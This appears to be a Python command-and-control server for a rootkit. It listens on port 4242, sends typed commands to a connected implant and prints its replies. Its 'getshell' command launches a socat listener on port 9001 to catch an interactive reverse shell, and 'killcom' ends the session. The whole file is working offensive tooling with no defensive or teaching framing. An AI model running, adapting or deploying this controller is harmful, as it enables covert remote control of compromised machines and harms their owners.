import socket
import threading
import subprocess
import os
import shutil
import time
from prompt_toolkit import PromptSession
from prompt_toolkit.patch_stdout import patch_stdout

# Configuration
HOST = '0.0.0.0'
PORT = 4242
STD_BUFFER_SIZE = 1024

# Control event (not used here but available for future improvements)
pause_event = threading.Event()
pause_event.set()


# Function to launch a terminal with socat
def run_socat_shell():
	terminal_cmd = None

	if shutil.which("gnome-terminal"):
		terminal_cmd = [
			"gnome-terminal",
			"--",
			"bash",
			"-c",
			"socat file:`tty`,raw,echo=0 tcp-listen:9001; exec bash"
		]
	elif shutil.which("xterm"):
		terminal_cmd = [
			"xterm",
			"-e",
			"bash -c 'socat file:`tty`,raw,echo=0 tcp-listen:9001; exec bash'"
		]
	elif shutil.which("konsole"):
		terminal_cmd = [
			"konsole",
			"-e",
			"bash",
			"-c",
			"socat file:`tty`,raw,echo=0 tcp-listen:9001; exec bash"
		]
	else:
		print("❌ [!] No compatible terminal found.")
		return

	try:
		subprocess.Popen(terminal_cmd)
		print("🚀 [*] Terminal launched with socat on port 9001.")
	except Exception as e:
		print(f"💥 [!] Error launching socat: {e}")


# Main server function
def start_server():
	while True:
		# Create and prepare the socket
		server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		server_socket.bind((HOST, PORT))
		server_socket.listen(1)

		print(f"📡 [*] Waiting for a connection on {HOST}:{PORT}...")

		# Wait for a connection
		connection, addr = server_socket.accept()
		print(f"✅ [+] Rootkit connected from {addr[0]}")

		# Store the result of the thread to know if we need to stop
		send_result = {}

		# Command sending thread
		def send_commands():
			session = PromptSession("🧠 You > ")
			with patch_stdout():
				while True:
					try:
						line = session.prompt().strip()
						if not line:
							continue

						# Special command: socat shell
						if line.lower() == "getshell":
							threading.Thread(target=run_socat_shell).start()
							time.sleep(1)  # Allow time to start

						# Send the command
						to_send = line + "\n"
						connection.sendall(to_send.encode())
						print(f"📤 [>] Command sent: {line}")

						# Special command: global stop
						if line.lower() == "killcom":
							print("❌ [-] Complete shutdown requested by the user.")
							return 'shutdown'

					except (KeyboardInterrupt, EOFError):
						print("\n⚠️ [!] User interruption. Closing...")
						break
					except Exception as e:
						print(f"💥 [!] Error: {e}")
						break

		# Response receiving thread
		def receive_responses():
			while True:
				try:
					data = connection.recv(STD_BUFFER_SIZE).decode()
					if data:
						print(f"\n📥 [rootkit] {data.strip()}")
					else:
						break
				except Exception as e:
					print(f"💥 [!] Reception error: {e}")
					break

		# Launch threads
		def wrapped_send_commands():
			result = send_commands()
			send_result['status'] = result

		send_thread = threading.Thread(target=wrapped_send_commands, daemon=True)
		receive_thread = threading.Thread(target=receive_responses, daemon=True)

		send_thread.start()
		receive_thread.start()

		send_thread.join()  # Wait for the sending to finish

		# Cleanup
		connection.close()
		server_socket.close()
		print("🔒 [*] Connection closed. Server stopped.")

		# If "killcom", exit completely
		if send_result.get('status') == 'shutdown':
			print("🛑 [*] Global program shutdown.")
			break


# Entry point
if __name__ == '__main__':
	start_server()